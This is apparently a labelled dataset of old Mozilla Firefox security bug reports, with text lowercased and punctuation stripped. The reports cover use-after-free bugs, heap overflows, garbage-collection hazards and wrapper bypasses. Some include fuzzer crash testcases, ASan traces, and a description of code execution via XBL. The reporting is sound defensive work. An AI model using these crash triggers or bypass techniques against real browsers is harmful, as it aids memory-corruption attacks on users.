ionmonkey assertion failure barrier verifier unmarked edge unknown gcpreservecode try regexp catch e try arraybuffer gc with t catch e try x verifyprebarriers r catch e try schedulegc 35 print y arraybuffer k catch e try q catch e try regexp catch e function for z 0 z 3 z e z x.h function crashes and throws the following error message on js opt shell on ionmonkey changeset 32638e411218 with ion-eager assertion failure barrier verifier unmarked edge unknown s-s and assuming sec-critical because gc seems related my js opt shell was compiled with enable-more-deterministic and enable-gczeal autobisect shows this is probably related to the following changeset the first bad revision is changeset 113229:6ba78023b367 user brian hackett date wed nov 14 06:46:31 2012 0800 summary eagerly generate a single copy of ion stubs and wrappers bug 786146 r=dvander	11
out of bounds read elementanimations ensurestylerulefor with css animation in a non-debug asan build this appears as a heap buffer overflow elementanimations ensurestylerulefor same signature as fixed bug 765218 in a non-asan build this crashes infrequently but adding onload-reload to the testcase makes it reliable enough bp-3a3f345f-bed8-46b1-a008-ee44f2130108 bp-cda868fb-6a82-4e77-86c9-3944a2130108 in a debug build the crash is masked by the abort in bug 662724 abort position should be in 0-1 0.0 positioniniteration positioniniteration 1.0 file layout/style/nsanimationmanager.cpp line 235	11
incorrect behavior on emscripten bullet test another failure on the emscripten test suite on x86_64 works with no-ion or in v8 fails with ion	11
investigate if presshell getcurrenteventframe should check that mcurrenteventcontent s ownerdoc mdocument otherwise mcurrenteventframe may start to point to an object in wrong presshell if someone manages to move mcurrenteventcontent to another document and then call presshell getcurrenteventframe	11
fix datadocumentcontentpolicy should apply to chrome documents it is very strange that data documents may load stuff if they are chrome documents this lead to bug 770684 though i ll fix that bug in some other way as far as i see we have similar problems as bug 770684 if someone does something like document.implementation.createhtmldocument body.innerhtml stuff if that stuff contains images or scripts they are loaded i think	11
assertion wrapper already in new scope with canvas adoptnode with user_pref gfx.canvas.azure.enabled false the testcase triggers assertion wrapper already in new scope newmap find wrapper getidentityobject file js/xpconnect/src/xpcwrappednative.cpp line 1651	11
crash opening/closing a select while entering/leaving fullscreen mode 1 create a profile directory with the following prefs.js file user_pref browser.fullscreen.autohide false user_pref browser.tabs.autohide true user_pref full-screen-api.allow-trusted-requests-only false 2 run firefox like this firefox foreground profile px/b r.html 3 verify that r.html is the only open tab and it is entering and exiting full-screen mode on its own 4 hold alt+down until it crashes result crash usually within 15 seconds	11
assertion when setting expando on a document xray if i run the js/xpconnect/tests/chrome/test_bug738244.xul test i get an assertion 0 ns_debugbreak_p aseverity=1 astr trying to wrap a holder aexpr js_getclass obj xrayutils holderclass afile mozilla/js/xpconnect/wrappers/wrapperfactory.cpp aline=328 at nsdebugimpl.cpp:285 1 in xpc wrapperfactory rewrap cx existing obj wrappedproto parent flags=0 at wrapperfactory.cpp:328 2 in jscompartment wrap this cx vp existing at jscompartment.cpp:401 3 in jscompartment wrap this cx objp existing at jscompartment.cpp:443 4 in jscompartment wrap this cx desc at jscompartment.cpp:483 5 in js_wrappropertydescriptor cx desc at jsfriendapi.cpp:247 6 in xpc xraywrapper js crosscompartmentwrapper xpc xpcwrappednativexraytraits defineproperty this cx wrapper id asbits 4554045312 desc at xraywrapper.cpp:1489 7 in js baseproxyhandler set this cx proxy receiver id asbits 4554045312 strict=false vp at jsproxy.cpp:203 8 in xpc xraywrapper js crosscompartmentwrapper xpc xpcwrappednativexraytraits set this cx wrapper receiver id asbits 4554045312 strict=false vp at xraywrapper.cpp:1598 from this line of the test doc.getelementbyid 42 not sure whether this is a regression or not but it does n't look good too bad mochitests do n't fail on asserts bobby do you know what s going on here	11
crash sizeofthis or crash checkmarkedthing due to oom during fuzzing i found the following crash on mozilla-central revision 98ea4d294369 program received signal sigsegv segmentation fault sizeofthis this at srv/repos/mozilla-central/js/src/vm/objectimpl-inl.h:370 370 return arenaheader getthingsize gdb bt 0 sizeofthis this at srv/repos/mozilla-central/js/src/vm/objectimpl-inl.h:370 1 copycachedtoobject src jsobject object object dst jsobject can not access memory at address at srv/repos/mozilla-central/js/src/jsobjinlines.h:1499 2 newobjectfromhit entry_=2 cx optimized out this at jscntxtinlines.h:111 3 js newobjectwithtype cx optimized out type parent jsobject object global delegate kind=js gc finalize_object4_background at srv/repos/mozilla-central/js/src/jsobj.cpp:1307 4 in createthisforfunctionwithtype parent optimized out type cx at srv/repos/mozilla-central/js/src/jsobj.cpp:1415 5 js_createthisforfunctionwithproto cx callee jsobject const object function testcase proto optimized out at srv/repos/mozilla-central/js/src/jsobj.cpp:1427 6 in js_createthisforfunction cx callee jsobject const object function testcase newtype=false at srv/repos/mozilla-central/js/src/jsobj.cpp:1452 7 in js ion canenter cx script fp newtype optimized out at srv/repos/mozilla-central/js/src/ion/ion.cpp:1461 8 in js interpret cx entryframe interpmode=js jsinterp_normal at srv/repos/mozilla-central/js/src/jsinterp.cpp:2411 9 in js runscript cx script fp at srv/repos/mozilla-central/js/src/jsinterp.cpp:348 10 in js executekernel cx script scopechain thisv type optimized out evalinframe result at srv/repos/mozilla-central/js/src/jsinterp.cpp:537 11 in evalkernel cx optimized out args evaltype optimized out caller scopeobj jsobject const object call delegate at srv/repos/mozilla-central/js/src/builtin/eval.cpp:286 12 in js directeval cx args at srv/repos/mozilla-central/js/src/builtin/eval.cpp:337 13 in js interpret cx entryframe interpmode=js jsinterp_normal at srv/repos/mozilla-central/js/src/jsinterp.cpp:2334 14 in js runscript cx script fp at srv/repos/mozilla-central/js/src/jsinterp.cpp:348 15 in js invokekernel cx args construct=js no_construct at srv/repos/mozilla-central/js/src/jsinterp.cpp:406 16 in invoke construct=js no_construct args cx at srv/repos/mozilla-central/js/src/jsinterp.h:131 17 js invoke cx thisv fval argc=1 argv optimized out rval at srv/repos/mozilla-central/js/src/jsinterp.cpp:439 18 in js ion invokefunction cx fun0 argc=1 argv rval at srv/repos/mozilla-central/js/src/ion/vmfunctions.cpp:108 19 in 20 in the crash is due to out-of-memory and the test is still quite complex so i was hoping it can be resolved without the test i took a backtrace from where oom is reported before the crash breakpoint 1 js_reportoutofmemory cx at srv/repos/mozilla-central/js/src/jscntxt.cpp:511 511 gdb bt 0 js_reportoutofmemory cx at srv/repos/mozilla-central/js/src/jscntxt.cpp:511 1 in js gc arenalists refillfreelist cx optimized out thingkind optimized out at srv/repos/mozilla-central/js/src/jsgc.cpp:1504 2 in newgcthing jsobject kind=js gc finalize_object16_background cx thingsize optimized out at jsgcinlines.h:505 3 js_newgcobject kind=js gc finalize_object16_background cx at jsgcinlines.h:584 4 create slots optimized out type shape optimized out kind=js gc finalize_object16_background cx at srv/repos/mozilla-central/js/src/jsobjinlines.h:972 5 newobject cx clasp type parent optimized out kind=js gc finalize_object16_background at srv/repos/mozilla-central/js/src/jsobj.cpp:1174 6 in newobjectwithclassproto kind=js gc finalize_object16_background parent optimized out proto clasp cx at srv/repos/mozilla-central/js/src/jsobj.cpp:1282 7 js newobjectwithclassproto cx clasp proto optimized out parent optimized out kind optimized out at srv/repos/mozilla-central/js/src/jsobj.cpp:1238 8 in newbuiltinclassinstance kind=js gc finalize_object16 clasp optimized out cx at jsobjinlines.h:1598 9 checknewscriptproperties cx type fun at srv/repos/mozilla-central/js/src/jsinfer.cpp:5132 10 in js types heaptypeset isownproperty this cx object optimized out configurable=true at srv/repos/mozilla-central/js/src/jsinfer.cpp:1897 11 in getdefiniteslot atom optimized out types cx optimized out at srv/repos/mozilla-central/js/src/ion/ionbuilder.cpp:5781 12 js ion ionbuilder jsop_setprop this name type at srv/repos/mozilla-central/js/src/ion/ionbuilder.cpp:6476 13 in js ion ionbuilder inspectopcode this op optimized out at srv/repos/mozilla-central/js/src/ion/ionbuilder.cpp:1051 14 in js ion ionbuilder traversebytecode this at srv/repos/mozilla-central/js/src/ion/ionbuilder.cpp:688 15 in js ion ionbuilder build this at srv/repos/mozilla-central/js/src/ion/ionbuilder.cpp:341 16 in js ion sequentialcompilecontext compile this optimized out builder optimized out graph optimized out autodelete at srv/repos/mozilla-central/js/src/ion/ion.cpp:1190 17 in js ion ioncompile js ion sequentialcompilecontext cx script fun jsfunction const can not access memory at address osrpc constructing=true compilecontext at srv/repos/mozilla-central/js/src/ion/ion.cpp:1151 18 in js ion compile cx optimized out script fun osrpc optimized out constructing optimized out at srv/repos/mozilla-central/js/src/ion/ion.cpp:1383 19 in js ion canenter cx script fp newtype optimized out at srv/repos/mozilla-central/js/src/ion/ion.cpp:1475 20 in js interpret cx entryframe interpmode=js jsinterp_normal at srv/repos/mozilla-central/js/src/jsinterp.cpp:2411 21 in js runscript cx script fp at srv/repos/mozilla-central/js/src/jsinterp.cpp:348 22 in js executekernel cx script scopechain thisv type optimized out evalinframe result at srv/repos/mozilla-central/js/src/jsinterp.cpp:537 23 in evalkernel cx optimized out args evaltype optimized out caller scopeobj jsobject const object call delegate at srv/repos/mozilla-central/js/src/builtin/eval.cpp:286 24 in js directeval cx args at srv/repos/mozilla-central/js/src/builtin/eval.cpp:337 25 in js interpret cx entryframe interpmode=js jsinterp_normal at srv/repos/mozilla-central/js/src/jsinterp.cpp:2334 26 in js runscript cx script fp at srv/repos/mozilla-central/js/src/jsinterp.cpp:348 27 in js invokekernel cx args construct=js no_construct at srv/repos/mozilla-central/js/src/jsinterp.cpp:406 28 in invoke construct=js no_construct args cx at srv/repos/mozilla-central/js/src/jsinterp.h:131 29 js invoke cx thisv fval argc=1 argv optimized out rval at srv/repos/mozilla-central/js/src/jsinterp.cpp:439 30 in js ion invokefunction cx fun0 argc=1 argv rval at srv/repos/mozilla-central/js/src/ion/vmfunctions.cpp:108 31 in 32 in now checking this trace frame 10 does a call that is infallible checknewscriptproperties cx typeobj fun in js/src/jsinfer.cpp around line 1897 not sure if this is the reason/cause for the problem maybe someone with more experience in that code can check marking s-s because the crash does n't look safe	11
qcms_transform_create can return null and some of the calling code is n't ready for it when qcms_transform_create fails like in 722831 a couple of places that call it indirectly through gfxplatform methods are not ready for it	11
fix nsdocumentviewer loadcomplete does n't guarantee that window object stays alive i was debugging bug 840019 and noticed that we may have a security bug there not only a null pointer crash setreadystateinternal dispatches readystatechanged yet we dispatch load event after that to window and window is just a raw pointer the patch fixes both this bug and bug 840019	11
heap-use-after-free in nsasyncdomevent run this bug was initially created as a clone of bug 835814 unfortunately this bug still exists after the patch of bug 835814 it just comes up on fewer occasions it s also probably harder to create a testcase for further unfortunately it blocks my work on bug 716140 i m getting a build up and running on the record-and-replay box 6846 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in nscomptr nsinodeinfo get const src dist/include/nscomptr.h:764 1 in nscomptr nsinodeinfo operator const src dist/include/nscomptr.h:784 2 in nsinode ownerdoc const src dist/include/nsinode.h:476 3 in nsasyncdomevent run src/content/events/src/nsasyncdomevent.cpp:35 4 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 5 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 6 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 7 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:215 8 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:208 9 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 10 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 11 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:288 12 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3823 13 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3890 14 in xre_main src/toolkit/xre/nsapprunner.cpp:4093 15 in do_main int char nsifile src/browser/app/nsbrowserapp.cpp:185 16 in main src/browser/app/nsbrowserapp.cpp:377 17 in is located 24 bytes inside of 208-byte region freed by thread t0 here 0 in interceptor_free 1 in moz_free src/memory/mozalloc/mozalloc.cpp:48 2 in operator delete void src dist/include/mozilla/mozalloc.h:224 3 in mozilla dom htmlimageelement htmlimageelement src/content/html/content/src/htmlimageelement.cpp:83 4 in nsnodeutils lastrelease nsinode src/content/base/src/nsnodeutils.cpp:258 5 in mozilla dom fragmentorelement release src/content/base/src/fragmentorelement.cpp:1685 6 in mozilla dom htmlimageelement release src/content/html/content/src/htmlimageelement.cpp:89 7 in nscomptr_base nscomptr_base src/objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc dist/include/nscomptr.h:410 8 in nscomptr nsinode nscomptr src dist/include/nscomptr.h:449 9 in nscomptr nsinode nscomptr src dist/include/nscomptr.h:449 10 in nsasyncdomevent nsasyncdomevent src dist/include/nsasyncdomevent.h:23 11 in nsloadblockingasyncdomevent nsloadblockingasyncdomevent src/content/events/src/nsasyncdomevent.cpp:63 12 in nsloadblockingasyncdomevent nsloadblockingasyncdomevent src/content/events/src/nsasyncdomevent.cpp:59 13 in nsrunnable release src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:31 14 in nscomptr_base nscomptr_base src/objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc dist/include/nscomptr.h:410 15 in nscomptr nsirunnable nscomptr src dist/include/nscomptr.h:449 16 in nscomptr nsirunnable nscomptr src dist/include/nscomptr.h:449 17 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:633 18 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:238 19 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 20 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:215 21 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:208 22 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 23 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 24 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:288 25 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3823 26 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3890 27 in xre_main src/toolkit/xre/nsapprunner.cpp:4093 28 in do_main int char nsifile src/browser/app/nsbrowserapp.cpp:185 29 in main src/browser/app/nsbrowserapp.cpp:377 previously allocated by thread t0 here 0 in interceptor_malloc 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:200 3 in ns_newhtmlimageelement already_addrefed nsinodeinfo mozilla dom fromparser src/content/html/content/src/htmlimageelement.cpp:66 4 in nsvideoframe createanonymouscontent nstarray nsianonymouscontentcreator contentinfo src/layout/generic/nsvideoframe.cpp:75 5 in non-virtual thunk to nsvideoframe createanonymouscontent nstarray nsianonymouscontentcreator contentinfo src/layout/generic/nsvideoframe.cpp:116 6 in nscssframeconstructor getanonymouscontent nsicontent nsiframe nstarray nsianonymouscontentcreator contentinfo src/layout/base/nscssframeconstructor.cpp:3903 7 in nscssframeconstructor processchildren nsframeconstructorstate nsicontent nsstylecontext nsiframe bool nsframeitems bool pendingbinding nsiframe src/layout/base/nscssframeconstructor.cpp:9967 8 in nscssframeconstructor constructframefromiteminternal nscssframeconstructor frameconstructionitem nsframeconstructorstate nsiframe nsframeitems src/layout/base/nscssframeconstructor.cpp:3745 9 in nscssframeconstructor constructframesfromitem nsframeconstructorstate nscssframeconstructor frameconstructionitemlist iterator nsiframe nsframeitems src/layout/base/nscssframeconstructor.cpp:5542 10 in nscssframeconstructor constructframesfromitemlist nsframeconstructorstate nscssframeconstructor frameconstructionitemlist nsiframe nsframeitems src/layout/base/nscssframeconstructor.cpp:9903 11 in nscssframeconstructor contentappended nsicontent nsicontent bool src/layout/base/nscssframeconstructor.cpp:6725 12 in nscssframeconstructor createneededframes nsicontent src/layout/base/nscssframeconstructor.cpp:6380 13 in nscssframeconstructor createneededframes src/layout/base/nscssframeconstructor.cpp:6405 14 in presshell flushpendingnotifications mozilla changestoflush src/layout/base/nspresshell.cpp:3867 15 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3757 16 in nsdocument flushpendingnotifications mozflushtype src/content/base/src/nsdocument.cpp:6727 17 in nsdocloader docloaderisempty bool src/uriloader/base/nsdocloader.cpp:729 18 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult src/uriloader/base/nsdocloader.cpp:659 19 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult src/uriloader/base/nsdocloader.cpp:663 20 in nsloadgroup removerequest nsirequest nsisupports tag_nsresult src/netwerk/base/src/nsloadgroup.cpp:676 21 in nsdocument dounblockonload src/content/base/src/nsdocument.cpp:7600 22 in nsdocument unblockonload bool src/content/base/src/nsdocument.cpp:7542 23 in nsdocument dispatchcontentloadedevents src/content/base/src/nsdocument.cpp:4408 24 in nsrunnablemethodimpl void nsdocument true run src dist/include/nsthreadutils.h:367 25 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe stats 274m malloced 295m for red zones by 451143 calls stats 48m realloced by 25728 calls stats 245m freed by 320606 calls stats 110m really freed by 202828 calls stats 492m 492m-0m mmaped 123 maps 0 unmaps mmaps by size class 8:294894 9:40955 10:12285 11:14329 12:4096 13:1536 14:1280 15:384 16:1216 17:1312 18:64 19:40 20:24 mallocs by size class 8:368736 9:40833 10:12926 11:17620 12:3670 13:2004 14:1736 15:459 16:1577 17:1440 18:77 19:42 20:23 frees by size class 8:256057 9:30657 10:9412 11:15499 12:2386 13:1682 14:1564 15:329 16:1481 17:1417 18:63 19:39 20:20 rfrees by size class 8:175259 9:10652 10:2677 11:10244 12:779 13:679 14:773 15:177 16:980 17:577 18:26 19:4 20:1 stats malloc large 1582 small slow 2700 stats stackdepot 0 ids 0m mapped 6846 aborting	11
nsboxobject getpresshell flushes without keeping the doc alive nsboxobject getpresshell keeps a raw pointer to document and calls flush the flush operation itself should be safe these days but the raw document pointer may point to a deleted object after the flush yet we use the document	11
freeing unallocated address with webgl i load this html head script id vshader type x-shader/x-vertex void main gl_position vec4 0,0,0,0 script script id fshader type x-shader/x-fragment precision mediump float uniform vec4 uni 1 void main vec4 c vec4 0,0,0,0 for int ii 11 ii 10 ii c uni ii gl_fragcolor vec4 c.r c.g c.b 0 script script function shader gl program shadertype shaderid var shadersource document.getelementbyid shaderid text var shader gl.createshader shadertype gl.shadersource shader shadersource gl.compileshader shader gl.attachshader program shader function aprogram gl var program gl.createprogram shader gl program gl.vertex_shader vshader shader gl program gl.fragment_shader fshader gl.linkprogram program gl.useprogram program return program var canvas document.createelement canvas var gl canvas.getcontext experimental-webgl aprogram gl gl.drawarrays gl.triangles 0 1 script head body body html and it says this attention default value of option force_s3tc_enable overridden by environment 9645 error addresssanitizer attempting free on address which was not malloc ed 0 in free 0 1 in 0 is located 127 bytes to the right of 0-byte region freed by thread t0 here 0 1 2 3 4 in 5 6 7 8 9 previously allocated by thread t0 here 0 in interceptor_calloc 0 1 in 0 stats 114m malloced 136m for red zones by 294525 calls stats 4m realloced by 16786 calls stats 53m freed by 157098 calls stats 0m really freed by 0 calls stats 288m 73768 full pages mmaped in 66 calls mmaps by size class 8:262128 9:24573 10:12285 11:8188 12:3072 13:1536 14:768 15:384 16:960 17:128 18:32 19:16 20:8 21:2 24:2 mallocs by size class 8:252481 9:22353 10:8092 11:6586 12:1960 13:1014 14:679 15:272 16:939 17:111 18:20 19:9 20:5 21:2 24:2 frees by size class 8:133911 9:11537 10:4458 11:4249 12:926 13:770 14:493 15:169 16:487 17:83 18:9 19:3 20:3 rfrees by size class stats malloc large 149 small slow 1554 9645 aborting on linux intel driver	11
blacklist mesa in esr17 nothing sensational here esr is the enterprise no-cool-stuff branch in esr10 mesa was blacklisted and we ve had many occasions to be thankful for that we should do the same for esr17 example bug 827106 i do n't want to have to ask for esr approval for a backport of this angle patch	11
assertion failure i 0 at jsopcode.cpp:5820 or crash js decompilevaluegenerator the following testcase asserts on mozilla-central revision 1b0b56afa33a run with m n a object.prototype.apply function.prototype.apply function testapplycallhelper f var i 0 i.apply this 2 testapplycallhelper	11
ftp use-after-free crash nsinputstreampump cancel this is a reproducible use-after-free crash which occurred while testing ftp server responses have n't managed it to get an external testcase for this bug but it crashes reliably in the fuzzer after some time the flow of the requests/responses is included in the file of the callstack the fake server accepts ftp connections from firefox some of the responses have no crlf token in the response ftp banner when firefox tries to handle upcoming connections it shows an alert message of the previous response where we did n't provide a crlf token clicking that alert box results in this crash i am guessing that this seems to be a problem in handling async connections and their state in the callstack of the free'ed thread we see 26 in nsftpstate stopprocessing nsftpconnectionthread.cpp:1866 27 in nsftpstate closewithstatus nsftpconnectionthread.cpp:2153 therefore i have put this into the ftp category the following assertions are shown before the crash occurs assertion ftp read state mixup error file users/cdiehl/code/mozilla/mc-asan-opt/netwerk/protocol/ftp/nsftpconnectionthread.cpp line 195 assertion read buffer does n't include response code line.length 4 startnum file users/cdiehl/code/mozilla/mc-asan-opt/netwerk/protocol/ftp/nsftpconnectionthread.cpp line 184 alloc netwerk/base/src/nsinputstreampump.cpp:64 nsrefptr nsinputstreampump pump new nsinputstreampump free netwerk/base/src/nsinputstreampump.cpp:141 although this class can only be accessed from one thread at a time we do allow its ownership to move from thread to thread assuming the consumer understands the limitations of this ns_impl_threadsafe_isupports3 nsinputstreampump nsirequest nsiinputstreamcallback nsiinputstreampump re-use netwerk/base/src/nsinputstreampump.cpp:188 185 close input stream 186 if masyncstream 187 masyncstream closewithstatus status 188 if msuspendcount 0 189 ensurewaiting tested on m-c changeset 112115:56d3db021482	11
crash when inline script in an xml doc framed by object removes the object nightly moz_xml_getcurrentcolumnnumber bp-66cc9dcd-b536-4a1e-bf23-a39492130310 debug+opt nsxmlcontentsink closeelement touching null asan+debug nsxmlcontentsink closeelement reading freed memory	11
plugin crash running script during plugin destruction i made a clean debug mac build of rev e23e43a2c14e if i load wait for the music to start then click on the stop button i get a crash the stack goes from plugin destruction into running a script which plays with things and that causes the crash this page has n't had a problem for me before so i suspect something changed either the website or something on mozilla-central this does n't seem to crash the latest nightly for whatever reason	11
it s a horrible idea to do new js value n and not root it/its contents while filling it in and while using it after in smsfilter getnumbers uint32_t length mdata.numbers length if length 0 anumbers jsval_null return ns_ok js value numbers new js value length for uint32_t i=0 i length i numbers i setstring js_newucstringcopyn acx mdata.numbers i get mdata.numbers i length anumbers setobjectornull js_newarrayobject acx length numbers ns_ensure_true anumbers isobject ns_error_failure return ns_ok if any of the js_newucstringcopyn trigger a gc anything before numbers i is likely to be garbage that ll trigger a crash on gc after the js_newarrayobject object gets collected at some later time similarly in smsmanager send js value requests new js value size for uint32_t i=0 i size i js value number if js_getelement cx numbers i number return ns_error_invalid_arg nsresult rv send cx global number.tostring amessage requests i ns_ensure_success rv rv areturn setobjectornull js_newarrayobject cx size requests ns_ensure_true areturn isobject ns_error_failure anumbers is user-controlled js_getelement can call arbitrary js code send may as well to create the smsrequest objects that get returned all returned values will get shoved into requests but none of those locations are roots so the returned objects will probably end up being collected then when the js_newarrayobject object gets gc d we ll probably crash the solution in both places is to use a value array type that the js engine knows about so that everything in it is properly rooted the smsmanager send code also looks pretty broken if someone calls the api passing a non-array object or an array that does n't contain all strings so i fixed those issues too in passing so that at least crashes do n't happen there seems to be no spec for how any of this should work so not-crashing is the best i can do in a quick fix technically as the sms code is behind the privileged firewall these issues are n't vulnerabilities in theory but i d rather play it safe just in case	11
mac buffer overflow of nsautotarray breakstate write of size 1 at thread t0 0 in ns_getcomplexlinebreaks nscarbonbreaker.cpp:36 1 in nsjisx4051linebreaker getjisx4051breaks nsjisx4051linebreaker.cpp:856 2 in nslinebreaker flushcurrentword nslinebreaker.cpp:77 nslinebreaker flushcurrentword nsautotarray uint8_t,4000 breakstate getjisx4051breaks breakstate.elements nscarbonbreaker.cpp ucfindtextbreak offset abreakbefore offset true	11
compartment mismatch in js_valuetosource inside js reportisnotfunction i came across this stack report i m not sure what the real problem is here but the immediate problem appears to be that js_valuetosource turns a value into an object then runs code on it without entering the compartment 0 js compartmentchecker fail js/src/jscntxtinlines.h:205 1 js invokekernel js/src/jsinterp.cpp:391 2 js invoke js/src/jsinterp.cpp:439 3 js_valuetosource js/src/jsstr.cpp:3537 4 js decompilevaluegenerator js/src/jsopcode.cpp:6260 5 js_reportvalueerrorflags js/src/jscntxt.cpp:1014 6 js reportisnotfunction js/src/jsinterp.cpp:271 7 js invokekernel js/src/jsinterp.cpp:370 8 js interpret js/src/jsinterp.cpp:2368 9 js runscript js/src/jsinterp.cpp:340 10 uncachedinlinecall js/src/methodjit/invokehelpers.cpp:372 11 js mjit stubs uncachedcallhelper js/src/methodjit/invokehelpers.cpp:460 12 js mjit callcompiler update js/src/methodjit/monoic.cpp:1236 13 js mjit ic call js/src/methodjit/monoic.cpp:1317 14 js mjit entermethodjit js/src/methodjit/methodjit.cpp:1041 15 js runscript js/src/jsinterp.cpp:345	11
assertion unexpected adocument after adopting content from xbl assertion unexpected adocument adocument mdocument file layout/base/nspresshell.cpp line 4073 assertion should be in an update while creating frames mupdatecount 0 file layout/base/nscssframeconstructor.cpp line 6532 and a memory leak security-sensitive because the second assertion has appeared in security bugs	11
assertion trying to compute style without presshell with editor cross-document selection assertion trying to compute style without presshell presshell file users/jruderman/trees/mozilla-central/editor/libeditor/html/nshtmlcssutils.cpp line 592 assertion wrong shell doc doc getshell this file users/jruderman/trees/mozilla-central/layout/base/nspresshell.cpp line 6582 the wrong shell assertion was added in a security bug bug 635852 i m guessing this will be fixed by not allowing selections to be in other documents that s part of the plan in bug 671152 and bug 768756 right	11
crash js types type objecttype or getvaluetype or assertion failure val.ismagic at jsobj.cpp try x x.length 7 object.defineproperty this y get function return concat x array.prototype.unshift.call x x catch e y 8 array.prototype.foreach.call y array.indexof crashes js opt shell on m-c changeset 1150403342b2 with no-baseline a no-ion at getvaluetype and crashes js debug shell at js types type objecttype s-s because scary memory address is being accessed this requires no-baseline and occurs when no-baseline was first added as a shell flag so autobisect is unable to get an accurate bisection the following variant does not crash js opt shell but asserts js debug shell at assertion failure val.ismagic at jsobj.cpp x x.length 7 object.defineproperty this y get function return concat x array.prototype.unshift.call x x y 1 undefined array.prototype.foreach.call y array.indexof	11
arbitrary code execution via xbl it is possible to compile a user-defined function in the xbl scope of a marquee element using seteventlistener method once the defined event is triggered the code running in the xbl scope can access all content protected by system only wrapper it can also open arbitrary chrome-privileged pages additionally remote web content can access privileged methods from property descriptor objects on chrome object wrappers fetched off of an xbl scope they can be subsequently used to perform a cross-site scripting attack on a frame with a privileged page which allows drive-by download of malware	2
xray waivers can be used to bypass cows this is the lynchpin of bug 863933 basically the prototype remapping code in wrapperfatory rewrap uses js wrapper wrappedobject instead of js uncheckedunwrap to determine if the underlying object is a standard prototype this means that if there s another wrapper in the middle like an xray waiver we can be fooled into thinking that the object is not a standard prototype however the code in chromeobjectwrapper.cpp unconditionally lets accesses to standard-prototype properties through under the assumption that they ll get remapped to fix this we should do a couple of things definitely stop using js wrapper wrappedobject here move this whole thing from prototype calculation into wrapperfactory prepareforwrapping so that we unconditionally get the right object when we cross the boundary in the long term we should really just kill this prototype remapping stuff entirely	2
new google maps does not show/update the map when being loaded or dragged around mozilla/5.0 x11 linux x86_64 rv:24.0 gecko/20130607 firefox/24.0 id:20130607031055 cset dc8e78ed8c44 the new google maps does not show the map during initial load and does even not get updated when you drag the map around it stays empty all the time it works fine in epiphany on linux and also on os x not sure if that is a hardware configuration or not after turning off hardware acceleration also does n't help it stays blank as i noticed there are situation when the map actually gets shown but i was n't able to reproduce it yet i m working with a lenovo x230 on ubuntu 13.04 also keep in mind that you need an invitation to use the new google maps not sure how many people will be affected by this yet but leaving this up for the drivers to decide how important it is	11
we do n't clear newly allocated webgl array buffers if their contents are not initially specified i m not sure if this is actually a sec issue bjacob might have a better idea do we do this for a reason does the spec specify that they re cleared to zero i ran into this while updating angle angle currently has a nice bug where it tries to copy the data during bufferdata even if data is null while this should work anyways i was surprised that we do this at all since it s possible to read data back out of array buffers obliquely	11
assertion failure agcthing after setting expando property on a domcursor var req mozcontacts.getall req.blabla function req is a domcursor assertion failure agcthing at xpcom/base/cyclecollectedjsruntime.cpp:831	11
gc hazard in xpcwrappednative wrapnewglobal with automarkingnativescriptableinfoptr in wrapnewglobal we created a a new xpcnativescriptableinfo and stash it in a automarkingnativescriptableinfoptr to keep it or rather its associated xpcnativescriptableshared alive but in certain cases we end up using the proto s si and delete the one we created however we fail to null out the automarkingptr so if we trigger a gc before the pointer goes out of scope which is exactly what my patch in bug 897322 does we ll end up marking garbage data which is a use-after-free this is probably a regression from bug 720580 which i landed about a year and a half ago i m going to hazard a guess that this is sec-high it s a use-after-free but mitigated in several ways in particular it s not clear that there s a way on trunk to trigger a gc at the right place though i m far from convinced that it s impossible and it the mark operation is limited enough that exploiting its use-after-free behavior would be very tricky	11
